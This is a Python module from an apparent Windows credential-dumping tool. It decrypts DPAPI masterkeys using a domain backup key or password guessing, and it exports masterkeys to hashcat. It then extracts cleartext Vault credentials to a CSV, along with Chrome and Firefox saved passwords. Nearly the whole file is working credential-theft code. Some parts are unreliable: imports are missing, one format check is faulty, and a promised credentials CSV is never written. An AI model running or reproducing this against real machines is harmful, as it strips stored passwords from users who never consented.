import base64
import json
import impacket.uuid
import impacket.dpapi

from Cryptodome.Cipher import PKCS1_v1_5
from Core.DPAPYCrypto import FirefoxDecrypt
from Core.DPAPYCrypto.DPAPImk2john import *
from impacket.dpapi import *
import logging
import os
from Cryptodome.Hash import HMAC, SHA1, MD4
from hashlib import pbkdf2_hmac

def locateAllMasterkeyDir(output=""):
    cwd = os.getcwd() + "/" + output
    allMasterkeyDir = []
    for subdir, dirs, files in os.walk(cwd):
        if(pathlib.Path(subdir).parts[-1] == "Masterkey"):
            allMasterkeyDir.append(subdir)
    return allMasterkeyDir

def getPreferredMasterkey(masterkeyDir):
    preferredMasterkey = ""
    for mdir in masterkeyDir:
        if(pathlib.Path(mdir).name =="Preferred"):
            Preferred = open(mdir, 'rb')
            guid = display_masterkey(Preferred)
            Preferred.close()
            preferredMasterkey = str(pathlib.Path(pathlib.Path(mdir).parent) / guid)
    return preferredMasterkey

# TODO : Recup les hash sur cette fonction
def masterKeyToHashcat(masterkeyPath,context="domain"):
    try:
        mkp = MasterKeyPool()
        masterkeyfile = open(masterkeyPath, 'rb')
        sid = pathlib.Path(masterkeyPath).parts[-2]
        mkdata = masterkeyfile.read()
        masterkeyfile.close()
        # Call the DPAPImk2john functionnalities
        mkp.addMasterKey(mkdata, SID=sid, context=context)
    except Exception as e:
        logging.fatal("ERROR decryptAllMasterKey")
        logging.critical("ERROR decryptAllMasterKey : ", e)
    return

def allMasterkeyToHashcat(allWindowsUsers,context="domain"):
    for userAllMasterkeyPath in allWindowsUsers:
        preferred = getPreferredMasterkey(userAllMasterkeyPath.masterkeyLocalPaths)
        if preferred:
            masterKeyToHashcat(preferred,context)
        else:
            continue
    print("[+] Extracted all the Preferred Masterkey to a hashcat format!")
    return

# TODO : Less shady catch/exception
def decryptAllMasterKeyWithPVK(allWindowsUsers,domainBackupKey=""):
    atLeastOne = False
    for winUser in allWindowsUsers:
        preferred = getPreferredMasterkey(winUser.masterkeyLocalPaths)
        try:
            dir,guid,key = decryptMasterKeyWithPVK(preferred, domainBackupKey)
            fp = open(dir + "_decrypted","wb")
            fp.write(key.encode("latin1"))
            fp.close()
            print("[+] Wrote down decrypted key " + guid + " at : " + dir + "_decrypted")
            winUser.masterkeyDecryptedLocalPaths.append(dir + "_decrypted")
            atLeastOne = True
        except Exception as e:
            logging.error("ERROR decryptAllMasterKey : ", e)
    if not atLeastOne:
        print("[-] Could not decrypt the differents masterkey :  wrong pvk-key or not domain related ?")
    return allWindowsUsers

# TODO : Catch error when using backupkey on std key not related to a domain
# Lazy asshole
def decryptMasterKeyWithPVK(masterkeypath,pvkpath):
    fp = open(masterkeypath, 'rb')
    data = fp.read()
    mkf = MasterKeyFile(data)
    fp.close()
    data = data[len(mkf):]
    if mkf['MasterKeyLen'] > 0:
        mk = MasterKey(data[:mkf['MasterKeyLen']])
        data = data[len(mk):]

    if mkf['BackupKeyLen'] > 0:
        bkmk = MasterKey(data[:mkf['BackupKeyLen']])
        data = data[len(bkmk):]

    if mkf['CredHistLen'] > 0:
        ch = CredHist(data[:mkf['CredHistLen']])
        data = data[len(ch):]

    if mkf['DomainKeyLen'] > 0:
        dk = DomainKey(data[:mkf['DomainKeyLen']])
        data = data[len(dk):]
    try:
        pvkfile = open(pvkpath, 'rb').read()
        key = PRIVATE_KEY_BLOB(pvkfile[len(PVK_FILE_HDR()):])
        private = privatekeyblob_to_pkcs1(key)
        cipher = PKCS1_v1_5.new(private)
        decryptedKey = cipher.decrypt(dk['SecretData'][::-1], None)
        if decryptedKey:
            # Linux here
            # domain_master_key = DPAPI_DOMAIN_RSA_MASTER_KEY(decryptedKey) probleme ici que je n'arrive pas à comprendre sur
            # DPAPI_DOMAIN_RSA_MASTER_KEY le cast ne passe pas ?
            # domain_master_key = DPAPI_DOMAIN_RSA_MASTER_KEY(decryptedKey)
            #key = domain_master_key['buffer'][:domain_master_key['cbMasterKey']]
            # Voir dpapi.py de impacket
            print('[+] Decrypted key ' + mkf['Guid'].decode(
                'utf-16le') + ' with domain backup key provided : 0x%s' % hexlify(decryptedKey[8:-32]).decode('latin-1'))
            return masterkeypath, mkf['Guid'].decode('utf-16le'), hexlify(decryptedKey[8:-32]).decode('latin-1')
    except Exception as e:
        logging.error("ERROR decryptMasterKey : " ,e)
    return ""

def decryptMasterKeyWithPassword(masterkeypath,key1,key2,key3):
    # All 3 keys are ok
    with open(masterkeypath,"rb") as f:
        data = f.read()
        mkf = MasterKeyFile(data)
        data = data[len(mkf):]
        if mkf['MasterKeyLen'] > 0:
            mk = MasterKey(data[:mkf['MasterKeyLen']])
            data = data[len(mk):]
        decryptedKey = mk.decrypt(key3)
        if decryptedKey:
            print('[+] Decrypted key with User Key (MD4 protected) : ' + masterkeypath.name)
            print('[+] Decrypted key: 0x%s' % hexlify(decryptedKey).decode('latin-1'))
            return
        decryptedKey = mk.decrypt(key2)
        if decryptedKey:
            print('[+] Decrypted key with User Key (MD4) : ' + masterkeypath.name)
            print('[+] Decrypted key: 0x%s' % hexlify(decryptedKey).decode('latin-1'))
            return
        decryptedKey = mk.decrypt(key1)
        if decryptedKey:
            print('[+] Decrypted key with User Key (SHA1) : ' + masterkeypath.name)
            print('[+] Decrypted key: 0x%s' % hexlify(decryptedKey).decode('latin-1'))
            return
    return decryptedKey

def decryptAllMasterKeyWithPassword(allWindowsUsers,password_list):
    for password in password_list:
        print("[+] Trying with password : " + password)
        for windowsuser in allWindowsUsers:
            for masterkeyLocalPath in windowsuser.masterkeyLocalPaths:
                for sid in windowsuser.SID:
                    try:
                        key1,key2,key3 = generateKeysfromPassword(password.strip(),sid)
                        decryptMasterKeyWithPassword(masterkeyLocalPath,key1,key2,key3)
                    except Exception as e:
                        print("Err ",e)

def decryptVaultFiles(windowsUser):
    GUID = ""
    vpolData = ""
    atLeastOne = False
    # Locate the vpolPath & extract the GUID
    for vpolpath in windowsUser.vaultLocalPaths:
        if ".vpol" in str(vpolpath):
            fp = open(vpolpath, 'rb')
            vpolData = fp.read()
            GUID = impacket.uuid.bin_to_string(VAULT_VPOL(vpolData)['Blob']['GuidMasterKey'])
        if vpolData != "":
            break
    # If we do not find any GUID let's break the loop and iterate another user
    if GUID == "":
        return
    # Locate the associated decrypted masterkey
    decrypted_masterkey = ""
    for masterpath in windowsUser.masterkeyDecryptedLocalPaths:
        if (GUID.lower() in str(masterpath).lower()) and ("decrypted" in str(masterpath).lower()):
            fp = open(masterpath, 'rb')
            decrypted_masterkey = fp.read()
            fp.close()
            break
    # We now have our VPOL data + our decrypted masterkey : let's decrypt the VPOL
    rc4_key, aes_key = decryptKeysVPOLdata(vpolData, decrypted_masterkey)
    # We have our keys to decrypt our vcrd files
    for vcrdpath in windowsUser.vaultLocalPaths:
        if ".vcrd" in str(vcrdpath):
            fp = open(vcrdpath, 'rb')
            vcrdData = fp.read()
            username, resource, password = decryptVCRDdata(vcrdData, rc4_key, aes_key)
            fp.close()
            fp = open(pathlib.Path(windowsUser.rootLocalDirTarget / "decrypted_vcrd.csv"), "a")
            fp.write(windowsUser.username + "," + resource + "," + username + "," + password)
            fp.close()
            atLeastOne = True
    return atLeastOne

def decryptAllVaultFiles(allWindowsUsers):
    atLeastOne = False
    for winUser in allWindowsUsers:
        if decryptVaultFiles(winUser):
            atLeastOne = True
    if atLeastOne:
        print("[+] All Vault data formatted and extracted to : decrypted_vcrd.csv")
    else:
        print("[-] No data from the Vault files have been extracted : wrong pvk-key ?")
    return

def decryptKeysVPOLdata(vpolData,decrypted_masterkey):
    key = unhexlify(decrypted_masterkey)
    vpol = VAULT_VPOL(vpolData)
    blob = vpol['Blob']
    rawdata = blob.decrypt(key)
    if rawdata is not None :
        keys = VAULT_VPOL_KEYS(rawdata)
        if keys['Key1']['Size'] > 0x24:
            key1 = hexdump(keys['Key1']['bKeyblob'])
            key2 = hexdump(keys['Key2']['bKeyblob'])
        else:
            key1 = hexlify(keys['Key1']['bKeyBlob']['bKey']).decode('latin-1')
            key2 = hexlify(keys['Key2']['bKeyBlob']['bKey']).decode('latin-1')

        return key1,key2
    else:
        return "",""

def decryptVCRDdata(vcrdData,rc4_key,aes_key):
    # TODO : Both keys ? RC4 vs AES ?
    key = unhexlify(aes_key)
    try:
        blob = VAULT_VCRD(vcrdData)
        for i, entry in enumerate(blob.attributesLen):
            if entry > 28:
                attribute = blob.attributes[i]
                if 'IV' in attribute.fields and len(attribute['IV']) == 16:
                    cipher = AES.new(key, AES.MODE_CBC, iv=attribute['IV'])
                else:
                    cipher = AES.new(key, AES.MODE_CBC)
                cleartext = cipher.decrypt(attribute['Data'])

        if cleartext is not None:
            # Lookup schema Friendly Name and print if we find one
            if blob['FriendlyName'].decode('utf-16le')[:-1] in VAULT_KNOWN_SCHEMAS:
                # Found one. Cast it and print
                vault = VAULT_KNOWN_SCHEMAS[blob['FriendlyName'].decode('utf-16le')[:-1]](cleartext)
                return (vault['Username'][:-2].decode('utf-16le'),vault['Resource'][:-2].decode('utf-16le'),
                        vault['Password'][:-2].decode('utf-16le'))
            else:
                # otherwise
                hexdump(cleartext)
            return
        else:
            blob.dump()
        return
    except Exception as e:
        logging.error("ERROR decryptAllMasterKey")
        logging.debug("ERROR decryptAllMasterKey : ", e)

def decryptCredentialsFiles(windowsUser):
    for masterpath in windowsUser.masterkeyDecryptedLocalPaths:
        blob = None
        if "decrypted" in str(masterpath).lower():
            fp = open(masterpath, 'rb')
            key_raw = fp.read()
            fp.close()
            for credFile in windowsUser.credentialsLocalPaths:
                try:
                    fp= open(credFile,'rb')
                    cred = CredentialFile(fp.read())
                    fp.close()
                    blob = DPAPI_BLOB(cred['Data'])
        # We now have a decrypted masterkey & a credential file : let's try to our credentials decrypt shall we ? (This is pure BF as we do not know which masterkey is the good one
                except Exception as e:
                    print("[-] Error retrieving credentials from : " + str(credFile))
                    logging.error("ERROR decryptCredentialsFiles 1 : ", e)
                if blob:
                    try:
                        decrypted_data = blob.decrypt(unhexlify(key_raw))
                        if decrypted_data is not None:
                            dCreds = CREDENTIAL_BLOB(decrypted_data)
                            # TODO : Handle format here
                            #dCreds.dump()
                            return 1
                    except Exception as e:
                        logging.fatal("ERROR decryptCredentialsFiles 2")
                        logging.error("ERROR decryptCredentialsFiles 2 : ", e)
                else:
                    return -1
    return 0

def decryptAllCredentialsFiles(allWindowsUsers):
    atLeastOne = False
    for winuser in allWindowsUsers:
        if decryptCredentialsFiles(winuser):
            atLeastOne = True
    if atLeastOne:
        print("[+] All Credentials data formatted and extracted to : credentials_blob.csv")
    else:
        print("[-] No data from the Credentials files have been extracted : wrong pvk-key ?")
    return

def retreiveGUIDLocalStateChrome(winuser):
    if winuser.chromeLocalPathLocalState != None:
        with open(winuser.chromeLocalPathLocalState,"rb") as f:
            localstatedata = json.load(f)
            blob = base64.b64decode(localstatedata['os_crypt']['encrypted_key'])
            # Remove 'DPAPI'
            try:
                formattedblob = DPAPI_BLOB(blob[5:])
                GUID = bin_to_string(formattedblob['GuidMasterKey'])
            except Exception as e:
                print(e)
    return GUID

def retrieveAESKeyFromLocalStateChrome(masterkey_guid,winuser):
    if winuser.masterkeyDecryptedLocalPaths:
        for masterpath in winuser.masterkeyDecryptedLocalPaths:
            if masterkey_guid.lower() in str(masterpath).lower():
                with open(masterpath,'rb') as f:
                    mstrkey = f.read().decode("latin1")
                    f.close()
                with open(winuser.chromeLocalPathLocalState,"rb") as f:
                    localstatedata = json.load(f)
                    blob = base64.b64decode(localstatedata['os_crypt']['encrypted_key'])
                    # Remove 'DPAPI'
                    formattedblob = DPAPI_BLOB(blob[5:])
                    f.close()
                    return formattedblob.decrypt(unhexlify(mstrkey), None)
    else:
        return


def decryptChromePassword(chrome_password,winuser):
    # 1. Search decrypted masterkey for our user (Get the GUID from the local state)
    GUID = retreiveGUIDLocalStateChrome(winuser)
    # Choix à faire : si pas de pvk key on fait quoi ?
    # 2. Decrypt the LOCAL STATE File to retrieve the AES Key
    AESKey = retrieveAESKeyFromLocalStateChrome(GUID,winuser)
    if not AESKey:
        return
    print("[+] Retrieve Chrome AES key from Local State : " + binascii.hexlify(AESKey).decode("utf8"))
    # 3. Decrypt the supplied password
    if(chrome_password[:3] == b'v10'):
        pass
    elif(chrome_password == b'v11'):
        pass
    else:
        print("[-] Chrome password format unknown")
    # Data to decrypt
    data = chrome_password[15:]
    decryptor = AES.new(AESKey,AES.MODE_GCM,chrome_password[3:15])
    return decryptor.decrypt(data[:-16]).decode("utf-8")

# Used to decrypt the masterkey
def generateKeysfromPassword(password,sid):
    # FROM impacket/dpapi.py
    # Will generate two keys, one with SHA1 and another with MD4
    key1 = HMAC.new(SHA1.new(password.encode('utf-16le')).digest(), (sid + '\0').encode('utf-16le'), SHA1).digest()
    key2 = HMAC.new(MD4.new(password.encode('utf-16le')).digest(), (sid + '\0').encode('utf-16le'), SHA1).digest()
    # For Protected users
    tmpKey = pbkdf2_hmac('sha256', MD4.new(password.encode('utf-16le')).digest(), sid.encode('utf-16le'), 10000)
    tmpKey2 = pbkdf2_hmac('sha256', tmpKey, sid.encode('utf-16le'), 1)[:16]
    key3 = HMAC.new(tmpKey2, (sid + '\0').encode('utf-16le'), SHA1).digest()[:20]
    return key1, key2, key3

def generateDerivedKeysFromUserKey(pwdhash,sid):
    if len(pwdhash) == 20:
        # SHA1
        key1 = HMAC.new(pwdhash, (sid + '\0').encode('utf-16le'), SHA1).digest()
        key2 = None
    else:
        # Assume MD4
        key1 = HMAC.new(pwdhash, (sid + '\0').encode('utf-16le'), SHA1).digest()
        # For Protected users
        tmpKey = pbkdf2_hmac('sha256', pwdhash, sid.encode('utf-16le'), 10000)
        tmpKey2 = pbkdf2_hmac('sha256', tmpKey, sid.encode('utf-16le'), 1)[:16]
        key2 = HMAC.new(tmpKey2, (sid + '\0').encode('utf-16le'), SHA1).digest()[:20]

    return key1, key2

# TODO: Implement your own way to decrypt logins.json you lazy asshole.
# Stolen from : https://github.com/unode/firefox_decrypt/blob/master/firefox_decrypt.py
# GNU General Public License v3.0
def decryptLoginsFirefox(profilePath):
    # Load Mozilla profile and initialize NSS before asking the user for input
    FirefoxDecrypt.setup_logging(1)
    moz = FirefoxDecrypt.MozillaInteraction()
    basepath = os.path.expanduser(profilePath)
    # Read profiles from profiles.ini in profile folder
    profile = FirefoxDecrypt.get_profile(basepath, False, None, False)
    # Start NSS for selected profile
    moz.load_profile(profile)
    # Check if profile is password protected and prompt for a password
    moz.authenticate(False)
    # Decode all passwords
    outputs = moz.decrypt_passwords()
    # Export passwords into one of many formats
    # Finally shutdown NSS
    moz.unload_profile()
    if outputs == 10:
        print("Error locating NSS module : firefox missing ?")
        return
    return outputs
